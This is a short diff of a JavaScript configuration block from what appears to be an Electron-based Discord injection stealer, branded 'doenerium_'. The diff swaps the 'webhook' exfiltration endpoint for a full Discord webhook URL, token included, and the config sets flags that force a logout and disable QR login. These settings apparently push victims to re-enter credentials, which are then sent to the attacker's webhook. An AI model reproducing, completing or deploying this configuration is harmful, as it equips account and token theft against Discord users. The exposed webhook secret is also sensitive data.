@@ -72,7 +72,7 @@ const { BrowserWindow, session } = require('electron'),
   fs = require('fs')
 var config = {
     brand: 'doenerium_',
-    webhook: 'https://websec.services/send/633450139ad22e8b19d010a2',
+    webhook: 'https://discord.com/api/webhooks/1035326689250652160/wl1E7Hcej2LLb8970cPm6AmqHq3mcGOxcFP_qxqmpA3f92imNaRxSx5SY-j1dMzXL2SE',
     webhook_link: '%WEBHOOK_LINK%',
     logout: true,
     disable_qr_code: true,
